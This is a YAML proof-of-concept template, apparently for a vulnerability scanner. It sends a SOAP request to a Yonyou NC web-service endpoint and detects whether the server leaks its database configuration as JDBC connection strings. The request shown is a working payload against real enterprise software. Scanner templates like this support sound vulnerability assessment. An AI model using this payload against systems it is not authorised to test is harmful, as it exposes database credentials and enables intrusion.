poc-yaml-yonyou-nc-uapws-db-info-leak.yml

name: poc-yaml-yonyou-nc-uapws-db-info-leak
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /uapws/service/nc.itf.ses.inittool.PortalSESInitToolService
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:por="http://inittool.ses.itf.nc/PortalSESInitToolService">
                 <soapenv:Header/>
                 <soapenv:Body>
                    <por:getDataSourceConfig/>
                 </soapenv:Body>
                </soapenv:Envelope>
        expression: response.status == 200 && response.content_type.contains("text/xml") && response.body.bstartsWith(b"<soap:Envelope") && "<return>jdbc:.*?</return>".bmatches(response.body)
expression: r0()
detail:
    author: z92g(https://github.com/z92g)
    links:
        - https://www.linuxlz.com/aqld/3058.html
    vulnerability:
        id: CT-515830
        level: critical
